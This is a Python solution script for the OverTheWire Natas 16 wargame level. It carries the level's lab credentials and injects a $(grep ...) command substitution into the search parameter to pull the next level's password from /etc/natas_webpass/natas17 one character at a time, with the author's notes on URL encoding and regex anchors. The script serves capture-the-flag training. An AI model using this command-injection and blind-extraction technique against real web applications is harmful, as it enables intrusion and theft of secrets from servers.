import requests  
from requests.auth import HTTPBasicAuth  
  
auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')  
  
filteredchars = ''  
passwd = ''  
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'  
for char in allchars:
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=test$(grep '+char+' /etc/natas_webpass/natas17)', auth=auth)
    if 'test' not in r.text:  
        filteredchars = filteredchars + char  
        print(filteredchars)  
  
for i in range(32): 
    for char in filteredchars:  
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=test%24%28grep+^'+passwd+char+'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search', auth=auth) 
        if 'test' not in r.text:  
            passwd = passwd + char  
            print(passwd)  
            break 


#I'm leaving the two request.gets different just to make the point that you can copy paste the url after submission like the second one or figure out how to write
#it out like the first one (to me, the second one seems like it would be much easier for future use)
#also note here that the caret ^ denotes beginning of line forcing it to work from the beginning of the password
#for future reference, end of line is denoted by $
